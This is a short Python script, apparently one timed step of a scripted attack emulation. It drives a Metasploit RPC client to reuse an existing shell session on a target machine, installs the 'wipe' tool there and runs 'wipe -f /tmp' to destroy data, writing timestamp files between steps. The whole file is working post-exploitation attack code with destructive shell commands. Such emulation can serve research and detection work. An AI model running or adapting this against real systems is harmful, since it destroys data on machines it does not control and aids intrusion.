import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    wipe_disk_folder = "/tmp"

    client = MsfRpcClient('kali')

    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)

    # start step 7
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    shell = client.sessions.session('4')
    shell.write('apt install wipe -y')
    time.sleep(30)
    shell.write("wipe -f {0}".format(wipe_disk_folder))

    while client.jobs.list:
        time.sleep(1)

    time.sleep(30)


main(sys.argv)
